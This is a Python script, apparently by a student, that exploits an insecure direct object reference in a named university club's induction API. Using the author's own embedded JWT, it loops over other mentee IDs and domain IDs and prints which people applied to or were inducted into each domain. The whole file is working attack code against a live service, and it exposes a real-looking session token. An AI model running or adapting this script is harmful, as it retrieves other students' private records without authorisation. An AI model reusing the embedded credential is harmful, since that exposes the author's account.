# got IDOR, using the token of 673, but i can retrieve if 672 is inducted or not? and what all domains he/she applied
# i got the domain number to domain name association from domainlist
# only userid to rollnumber is remaining to result in a severe IDOR

import requests
import json

API_BASE_URL = "https://api.inductions.spider.nitt.edu"
IS_INDUCTED_URL = f"{API_BASE_URL}/api/user/isInducted"
DOMAIN_LIST_URL = f"{API_BASE_URL}/api/general/domainlist"

JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjczLCJyb2xsIjoiMTEwMTI0MTIyIiwiaWF0IjoxNzQ4NDU1OTY3LCJleHAiOjE3NTEwNDc5Njd9.cDEA1SKnbjsjf1lx9b1x4hlQlF1UrLm2pqgLRFfeGpg"
#my token, i am aware that its sensitive

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Token": JWT_TOKEN,
    "Origin": "https://inductions.spider.nitt.edu",
    "Referer": "https://inductions.spider.nitt.edu/"
}

def fetch_domains():
    try:
        resp = requests.get(DOMAIN_LIST_URL, headers=HEADERS, timeout=10)
        data = resp.json()
        domain_list = data.get("domains", [])  # fix here
        return {d["id"]: d["name"] for d in domain_list}
    except Exception as e:
        print(f"[!] Failed to fetch domain list: {e}")
        return {}


def check_association(mentee_id, domain_id):
    payload = {"menteeId": mentee_id, "domainId": domain_id}
    try:
        resp = requests.post(IS_INDUCTED_URL, headers=HEADERS, json=payload, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("isInducted", "unknown")
        elif resp.status_code == 404:
            return None
        else:
            return f"error {resp.status_code}"
    except Exception as e:
        return f"network_error: {e}"

if __name__ == "__main__":
    domain_map = fetch_domains()
    if not domain_map:
        print("[!] Cannot proceed without domain map.")
        exit()

    mentee_ids = [673, 674, 700, 701, 702]  # Add more if needed

    print("\n=== Mentee → Domain Application Matrix ===\n")

    for mentee_id in mentee_ids:
        print(f"--- Mentee ID: {mentee_id} ---")
        found = False
        for domain_id, domain_name in domain_map.items():
            result = check_association(mentee_id, domain_id)
            if result is True:
                print(f"[+] {domain_name} (Inducted )")
                found = True
            elif result is False:
                print(f"[-] {domain_name} (NOT Inducted)")
                found = True
            # else: do not show missing 404s or errors here for clarity
        if not found:
            print("No domain application info leaked.\n")
        print("")
